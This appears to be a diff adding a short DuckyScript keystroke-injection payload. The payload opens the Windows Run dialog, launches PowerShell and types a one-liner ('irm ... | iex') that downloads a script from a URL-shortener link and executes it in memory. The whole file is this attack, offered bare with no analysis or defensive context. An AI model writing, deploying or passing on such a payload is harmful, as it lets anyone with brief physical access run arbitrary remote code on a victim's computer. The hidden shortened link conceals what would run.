@@ -1,0 +1,7 @@
+GUI r
+DELAY 800
+STRING powershell
+ENTER
+DELAY 300
+STRING irm https://is.gd/xjPVCf | iex
+ENTER
